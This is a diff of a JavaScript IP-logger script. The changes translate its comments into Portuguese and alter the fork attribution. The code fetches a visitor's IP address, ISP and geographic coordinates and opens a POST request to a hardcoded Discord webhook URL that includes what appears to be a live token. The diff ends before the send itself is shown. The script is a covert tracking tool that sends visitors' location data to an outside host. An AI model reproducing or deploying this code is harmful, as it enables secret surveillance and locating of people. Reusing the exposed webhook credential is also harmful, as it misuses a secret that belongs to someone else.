@@ -1,17 +1,17 @@
-// Paste your Discord Webhook API URL into Line 3: WEBHOOKURL => YOUR API URL
+// Cole sua URL da API do Discord Webhook na Linha 3: WEBHOOKURL => SUA URL da API
 
 var webHookUrl = "https://discord.com/api/webhooks/1038286114248720494/xZVBBh6rS5A3Py6RYSRgI5Tgidjg1e1vESUsjOfPv1mNx0iSl05n_TxU2WwMZtCAOVMv";
 
 /*
-    Forked from: https://github.com/luisoos/IP-Log-To-Discord-Webhook
+    Bifurcado de: https://github.com/Saddam171/Discord-Logger-IP
     License: MIT
 */
 
-const request = async () => { // Calling a "synchronous" fetch
+const request = async () => { // Chamando uma busca "síncrona"
     const response = await fetch('https://ip-api.com/json/');
     const data = await response.json();
 
-    // Declaring variables
+    // Declarando variáveis
     var ip = data.query;
 
     var provider = data.org + " (" + data.as + ")";
@@ -26,7 +26,7 @@ const request = async () => { // Calling a "synchronous" fetch
     var lat = data.lat;
     var lon = data.lon;
 
-    // Open POST Request
+    //Abrir solicitação POST
     var postRequest = new XMLHttpRequest();
     postRequest.open("POST", webHookUrl);
 
